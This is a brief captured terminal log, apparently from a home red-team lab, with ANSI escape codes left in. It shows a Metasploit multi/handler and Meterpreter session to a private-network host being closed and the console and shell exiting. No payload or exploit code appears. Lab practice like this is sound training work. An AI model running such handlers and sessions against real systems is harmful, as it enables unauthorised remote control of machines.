+[1m[34m[*][0m 192.168.1.113 - Meterpreter session 1 closed.  Reason: User exit
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> exi[K[K[Kexit -y
+[0m[?2004h]0;nikolay@debian: ~/lab/Red_Team_Repo/04_Enumeration[01;32mnikolay@debian[00m:[01;34m~/lab/Red_Team_Repo/04_Enumeration[00m$ exit
+[?2004lexit
+
+Script conclu√≠do em 2026-05-15 09:34:15-03:00 [COMMAND_EXIT_CODE="0"]
